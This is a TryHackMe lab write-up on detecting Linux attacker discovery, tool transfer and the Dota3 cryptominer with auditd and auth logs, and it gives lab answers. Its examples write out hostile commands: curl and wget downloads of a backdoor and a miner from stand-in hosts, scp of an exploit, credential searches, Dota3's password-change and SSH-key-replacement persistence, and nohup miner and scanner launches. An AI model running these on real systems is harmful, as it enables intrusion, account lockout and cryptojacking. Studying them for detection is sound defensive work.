---
title: Linux Threat Detection 2
module: Linux Security Monitoring
path: SOC Level 1
platform: TryHackMe
tags: [linux, threat-detection, discovery, ingress-tool-transfer, cryptominer, dota3, auditd, mitre]
status: completed
date: 2026-07-01
date_completed: 2026-07-02
---

*Write-up by [Miyu7x](https://github.com/Miyu7x) | TryHackMe: [Miyu7](https://tryhackme.com/p/Miyu7) | BTLO: [Miyu7x](https://blueteamlabs.online/public/user/Miyu7x)*

<p align="center">
<img src=screenshots/linux2_intro.png width="1500">
</p>

---

## Task 1 -- Introduction

### Learning Objectives

What happens after an attacker enters a Linux System?
  - What commands do they run?
  - What is their final goal?
  - How do attackers upload malware onto their targets?

How can SOCs detect their actions, by investigating Discovery commands in logs?

---

## Task 2 -- Discovery Overview

### Discovery

The majority of Linux breaches happen to be initiated by automated botnets. The attacker is notified, and the attacker's command center is just the bash.

<p align="center">
<img src=screenshots/linux2_botnet.png width="700">
</p>

### First Actions

The starting commands attackers use once they have access to the system's bash are usually the same:
  - Who am I? Where am I? What privileges do I have?
  - Attackers use the same commands IT teams across the world are constantly using, so how do you distinguish?
  - whoami is a command that's always suspicious to see in isolation, especially from an unexpected parent process

| Discovery Goal | Typical Commands |
|---|---|
| OS and Filesystem Discovery | pwd, ls /, env, uname -a, lsb_release -a, hostname |
| User and Groups Discovery | id, whoami, w, last, cat /etc/sudoers, cat /etc/passwd |
| Process and Network Discovery | ps aux, top, ip a, ip r, arp -a, ss -tnlp, netstat -tnlp |
| Cloud or Sandbox Discovery | systemd-detect-virt, lsmod, uptime, pgrep "<edr-or-sandbox>" |

---

1. Run systemd-detect-virt to detect the system's cloud. What is the command's output you discovered?

<p align="center">
<img src=screenshots/linux2_amazon.png width="700">
</p>

An attacker in the **Discovery Phase** will run commands to get a lay of the land. The command **systemd-detect-virt**, in this case, returned Amazon, telling the attacker information about the network and its cloud provider.

**Answer: Amazon**

---

2. Now run ps aux and look for EDR or antivirus processes. What is the full path to the detected antimalware binary?

<p align="center">
<img src=screenshots/linux2_malscan.png width="700">
</p>

During the attacker's discovery phase, they need to know which processes are currently running on a system so they can determine what security measures they're up against.

**Answer: /var/lib/ultrasec/malscan**

---

## Task 3 -- Detecting Discovery

### Specialized Discovery

After **Initial Discovery**, attackers can then decide their next move:
  - Data stealers look for passwords and secrets to collect
  - Crypto miners query for CPU and GPU info to optimize mining
  - Botnet scripts scan the network for new victims
  - Some malware combines all of the above

| Attack Objectives | Typical Commands |
|---|---|
| Find and steal credentials and other sensitive data | history \| grep pass, find / -name .env, find /home -name id_rsa |
| Identify how suitable the system is for crypto mining | cat /proc/cpuinfo, lscpu \| grep Model, free -m, top, htop |
| Scan the internal network for other future victims | ping <ip>, for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22 done |

### Detecting Discovery

Using Auditd, you can configure rules to log specific commands, then hunt for Discovery activity using a SIEM or ausearch.
  - How do you know which commands are regular IT work, a legitimate service, or an attacker?
  - A web server suddenly spawning **whoami** is a red flag
  - IT members legitimately use commands such as **find** and **grep** for secrets during normal work
  - A legitimate monitoring tool may periodically use **ping**

**Example: Steps to Detect Discovery**
<p align="center">
<img src=screenshots/linux2_detectdiscovery.png width="700">
</p>

**Example: Tracing Whoami Origin**
```
ubuntu@thm-vm:~$ ausearch -i -x whoami # Look for a Discovery command like whoami
type=PROCTITLE msg=audit(08/25/25 16:28:18.107:985) : proctitle=whoami
type=SYSCALL msg=audit(08/25/25 16:28:18.107:985) : arch=x86_64 syscall=execve success=yes exit=0 items=2 ppid=3898 pid=3907 auid=ubuntu uid=ubuntu exe=/usr/bin/whoami

ubuntu@thm-vm:~$ ausearch -i --pid 3898 # Identify its parent process, a lp.sh script
type=PROCTITLE msg=audit(08/25/25 16:28:11.727:982) : proctitle=/usr/bin/bash /tmp/lp.sh
type=SYSCALL msg=audit(08/25/25 16:28:11.727:982) : arch=x86_64 syscall=execve success=yes exit=0 items=2 ppid=3840 pid=3898 auid=ubuntu uid=ubuntu exe=/usr/bin/bash

ubuntu@thm-vm:~$ ausearch -i --ppid 3898 # Look for other processes created by the lp.sh
[Five more commands like "find /home -name *secret*" confirming the script is malicious]
```

For this task, imagine you received a SIEM alert about a spike in Discovery commands.
The first thing you see is that the **itsupport** user launched the **hostname** command.
Can you continue the investigation on the VM and find out what really happened?

---

1. What is the path of the script that initiated the "hostname" command?

<p align="center">
<img src=screenshots/linux2_hostname.png width="700">
</p>

We are looking for the parent process that initiated hostname. We ran `ausearch -i -x hostname` and found `ppid=3771` and `pid=3772` (hostname's own PID). Since 3771 is the PID of the parent process, we searched `ausearch -i --pid 3771` to identify what that process was. This revealed `proctitle=bash debug.sh` with `cwd=/home/itsupport`.

**Answer: /home/itsupport/debug.sh**

---

2. What was the last Discovery command launched by the script?

<p align="center">
<img src=screenshots/linux2_lastdiscovery.png width="700">
</p>

Searching for the commands run by the script debug.sh, we investigated the full process tree with `ausearch -i --ppid 3771`. Reading through the results by timestamp, the last genuine **Discovery** command observed was:

`type=PROCTITLE msg=audit(09/11/25 18:29:48.965:1130) : proctitle=ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu`

A `head -n 10` call appears immediately after this in the logs with a later timestamp, but it is only trimming the ps output to its top 10 lines rather than performing any discovery of its own, so it doesn't count as a separate Discovery command.

**Answer: ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu**

---

3. Looking at the script content, what's the email of the script author?

<p align="center">
<img src=screenshots/linux2_thmemail.png width="700">
</p>

Let's read the script file directly using the path we discovered earlier: `sudo cat /home/itsupport/debug.sh`. We can see the entire script, including the last command it runs, which we already identified in the previous question:

```
echo "--- Top CPU-consuming processes ---"
ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head -n 10
```

**Answer: greg@tryhackme.thm**

---

## Task 4 -- Motivation for Attacks

### "Hack and Forget" Attacks

Linux attacks are broken down into two categories:
  - Hack and Forget: quick gains, botnets, used as a proxy
  - Targeted Attacks

Attackers use **Ingress Tool Transfer**, MITRE technique T1105, to continue attacking their victim.

### Ingress Tool Transfer

| Command | Usage Example |
|---|---|
| Wget: Download a file from the website | wget https://github.com/xmrig/[...]/xmrig-x64.tar.gz -O /tmp/miner.tar.gz |
| Curl: Make a request to the webpage | curl --output /var/www/html/backdoor.php "https://pastebin.thm/yTg0Ah6a" |
| SSH: Transfer a file via SCP or SFTP | scp kali@c2server:/home/kali/cve-2021-4034.sh /tmp/cve-2021-4034.sh |

These commands can all be logged with auditd and can sometimes appear in bash history, but smart attackers don't let their commands get logged.
If the attacker is running the operation through SSH, there will be no visible logs of the transfer commands themselves on the victim's system, but there will be a **visible SSH login**. The same holds true for FTP and SMB.

**Example: Option 1 -- Attacker Connects to Victim**
```
attacker@attack-vm:~$ scp ./malware.sh ubuntu@thm-vm:/tmp
[OK] Connecting to thm-vm machine via SSH...
[OK] Logged in on thm-vm via SSH as "ubuntu"
[OK] File transferred from attack-vm to thm-vm
[OK] Job is done, logging out from thm-vm

# To detect on victim, look for SSH logins in /var/log/auth.log
```

**Example: Option 2 -- Victim Connects to Attacker**
```
ubuntu@thm-vm:~$ scp attacker@attack-vm:./malware.sh /tmp
[OK] Connecting to attack-vm machine via SSH...
[OK] Logged in on attack-vm via SSH as "attacker"
[OK] File transferred from attack-vm to thm-vm
[OK] Job is done, logging out from attack-vm

# To detect on victim, look for "scp" command in Auditd logs
```

### Additional Detection

**Auditd** offers a view into process creation events.

Authentication logs help identify suspicious SSH logins.

Ingress Tool Transfer Detection:

  - Network Traffic
      - Downloads from a suspicious IP
      - Downloads from a suspicious domain such as qfpkvwgq.thm
      - Downloads from public services known to host attack tools, like GitHub
  - File Events
      - Newly created file in temp folders: /tmp or /var/tmp
      - Newly created file named: exploit, shell.php, or kF1pBsY5
  - Antivirus Alerts
      - EDR or antivirus alert triggering on a new malicious file or process

---

1. From which domain was the Elastic agent downloaded?

<p align="center">
<img src=screenshots/linux2_elasticdomain.png width="700">
</p>

When searching for where downloaded files came from, we can start with the **wget** command, since its arguments include the source URL. This tells us the domain, which helps confirm whether the file is legitimate or came from a suspicious site.

Command: **sudo ausearch -i -x wget**

**Answer: artifacts.elastic.co**

---

2. What is the full path to the downloaded "helper.sh" script?

<p align="center">
<img src=screenshots/linux2_curldl.png width="700">
</p>

There are two common ways to spot downloaded files. We already checked **wget** and didn't observe any helper.sh script there, so we check the next option, **curl**.

Command: **sudo ausearch -i -x curl**

We observe the file being downloaded to: /var/tmp/helper.sh

**Answer: /var/tmp/helper.sh**

---

3. Which of the downloaded files is more likely to be malicious: the one downloaded with curl or wget?

From the previous question, we learned the Elastic agent was downloaded from a legitimate domain. The curl file is suspicious for two main reasons: drobbox-online.thm appears to be mimicking the real Dropbox domain, and the file was downloaded to the /tmp folder, which attackers favor since it typically doesn't require elevated privileges to write to.

**Answer: curl**

---

## Task 5 -- Dota3: First Actions

### Dota 3 Malware Analysis

In the real world, what do these infections actually look like?

### Initial Access

**Example:**
- A botnet of more than 2000 distinct IPs across 94 countries scans the internet for systems with open SSH
- The botnet brute-forces the systems, mainly targeting the root user and trying the top 1000 weak passwords
- If the password is guessed, one of the botnet hosts accesses the victim via SSH and continues the attack

### Discovery

With the SSH session **active**, the attacker automates the process by quickly running multiple Discovery commands.

**Example: Cryptominer Infection**
  - We can deduce this is cryptominer malware, since there's no other reason an attacker would run discovery commands to find info about CPU and RAM

```bash
# Checks CPU and RAM information
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
lscpu | grep Model
# Unclear purpose
ls -lh $(which ls)
# Generic Discovery
crontab -l
w
uname -m
```

### Persistence

We can observe **Persistence** actions:
  - The first command changes the password (in case another botnet tries to take over)
  - The following commands replace all SSH keys with malicious ones (locking the system owner out of the server)
  - This ensures the attacker maintains access to the victim

```bash
echo -e "ubuntu123\nN2a96PU0mBfS\nN2a96PU0mBfS"|passwd|bash >> up.txt
cd ~
rm -rf .ssh
mkdir .ssh
# Note the "mdrfckr" comment, unique to this attack
echo "ssh-rsa [ssh-key] mdrfckr" >> .ssh/authorized_keys
chmod -R go= ~/.ssh
```

### Detecting the Attack

Weak SSH passwords remain a leading reason Linux systems get breached daily.
  - If you had a SIEM, you would receive multiple alerts regarding SSH and logins
      - Spike in Discovery commands
      - Match against known attack strings

| Log Source | Description |
|---|---|
| Auth Logs: cat /var/log/auth.log \| grep "Accepted" | Look for successful SSH logins by password from untrusted, external IP addresses |
| Auditd Process Logs: ausearch -i -x [command] | Look for execution of Discovery commands (e.g. uname, lscpu) and trace their origin |

---

For this task, try detecting a similar cryptominer infection chain on the VM.
Open the /home/ubuntu/scenario folder and use the logs inside to answer the questions.
Note that the auditd logs here can be viewed with `ausearch -i -if /home/ubuntu/scenario/audit.log`.

---

1. Which IP address managed to brute-force the exposed SSH?

<p align="center">
<img src=screenshots/linux2_exposedssh.png width="700">
</p>

When searching for brute-force attacks, we look for multiple failed logins in a row from the same source, targeting the same user, in a short time window. To find evidence of this, we investigate the **Authorization Logs** at `/home/ubuntu/scenario/auth.log`, filtering for "Failed" SSH login attempts.

Command: **grep -a "Failed" /home/ubuntu/scenario/auth.log**

This revealed repeated failed password attempts against the root account from a single IP. We then confirmed it was the successful brute-force source by cross-referencing that same IP against the "Accepted" logins, where it appeared logging in successfully as root shortly after the failed attempts.

**Answer: 45.9.148.125**

---

2. Which command did the attacker use to list the last logged-in users?

<p align="center">
<img src=screenshots/linux2_last.png width="700">
</p>

To narrow down the noise, we filter the audit log to just EXECVE records (which contain the actual command and arguments as plain text) and then search within those for command names related to login history.

Command: **sudo ausearch -i -if /home/ubuntu/scenario/audit.log | grep "type=EXECVE" | grep "last"**

This surfaced the command `last`, which lists the system's most recent login history, confirming this as the tool the attacker used to check for other users who had recently accessed the box.

**Answer: last**

---

3. Which three EDR processes did the attacker look for with "egrep"? Answer Format: Separated by a comma, in alphabetical order.

<p align="center">
<img src=screenshots/linux2_falcon.png width="700">
</p>

Filtering the same way (EXECVE records containing "egrep") surfaced several egrep calls. Most were unrelated system checks (filesystem mount types, for example), but one stood out for its distinct pattern of three tool-like names joined with pipes rather than filesystem paths:

`type=EXECVE msg=audit(09/11/25 21:13:37.725:2129) : argc=4 a0=/bin/sh a1=/usr/bin/egrep a2=--color=auto a3=falcon|sentinel|ds_agent`

This is the attacker checking running processes for known EDR/antivirus agent names (CrowdStrike Falcon, SentinelOne, and Trend Micro's Deep Security Agent) before continuing, a Defense Evasion step to confirm they weren't being monitored.

**Answer: ds_agent,falcon,sentinel**

---

## Task 6 -- Dota3: Miner Setup

### Cryptominer Setup

Following the infection chain, since the attackers have maintained persistence and SSH access, what is their next move?
  - Install additional malware?
  - Upload tools via SCP using the previously changed password?

**Example: How Threat Actors Transfer Malware**
```
user@bot-1672$ scp dota3.tar.gz ubuntu@victim:/tmp
[OK] Transfered dota3.tar.gz file to the victim
```

As shown above, the attackers transferred the tool: **dota3.tar.gz**
  - Next, the attackers unpack it in a hidden folder inside /tmp
  - The attackers name the directories to look like legitimate software, such as **.X26-unix**
      - This can make SOCs overlook the malicious files, since the name appears legitimate

```bash
# Prepare a hidden /tmp/.X26-unix folder for malware
cd /tmp
rm -rf .X2*
mkdir .X26-unix
cd .X26-unix
# Unarchive malware to /tmp/.X26-unix/.rsync/c folder
tar xf dota3.tar.gz
sleep 3s
cd /tmp/.X26-unix/.rsync/c
```

Lastly, the attackers execute two binaries: **tsm** and **initall**
  - tsm is a custom network scanner that probes the internal network for other exposed SSH services
  - initall is an XMRig cryptominer
      - Both binaries are launched with **nohup**, which allows processes to keep running in the background even after the SSH session closes

```bash
# Scan the internal network with the "tsm" malware
nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 192.168 >> /dev/null 2>1&
sleep 8m
nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 172.16 >> /dev/null 2>1&
sleep 20m
# Run the actual cryptominer named "initall"
cd ..; nohup /tmp/.X26-unix/.rsync/initall 2>1&
# That's it, Dota3 attack is now completed!
exit 0
```

### Detecting the Attack

Some common rules EDRs are usually loaded with:

Auditd logs: Creation of untrusted, hidden files and folders in the /tmp directory
Auditd logs: Creation of files named like known malware, such as dota3.tar.gz
Auditd logs: Usage of commands often observed in attacks, such as nohup
Network traffic: SSH port scans across whole 192.168.* and 172.16.* ranges
EDR solution: The XMRig cryptominer binary is blocked by most EDRs (VirusTotal Example(opens in new tab))

---

1. What is the name of the malicious archive that was transferred via SCP?

<p align="center">
<img src=screenshots/linux2_kernedup.png width="700">
</p>

Since transferred files usually end up in the /tmp folder, we start our search there.

Command: **sudo ausearch -i -if /home/ubuntu/scenario/audit.log | grep 'tmp'**

**Answer: kernupd.tar.gz**

---

2. What was the full command line of the cryptominer launch?

<p align="center">
<img src=screenshots/linux2_kernedup.png width="700">
</p>

While investigating the /tmp results, we spotted **nohup**, which is used to launch binaries so they persist after the SSH session ends:

`type=PROCTITLE msg=audit(09/11/25 21:16:08.668:2338) : proctitle=nohup /tmp/.apt/kernupd/kernupd`

**Answer: nohup /tmp/.apt/kernupd/kernupd**

---

3. Which IP address range did the attacker scan for an exposed SSH? Answer Example: 10.0.0.1-10.0.0.126.

<p align="center">
<img src=screenshots/linux2_nohup.png width="700">
</p>

Since nohup was used to launch the scanning binary, we filtered specifically for `proctitle=nohup` entries to isolate every command run through it. This surfaced the network scanner's arguments, which included the target IP range it swept for exposed SSH services.

**Answer: 10.10.12.1-10.10.12.10**

---

## Task 7 -- Conclusion

### Key Takeaways

---

1. Let's move on!

**Answer:**
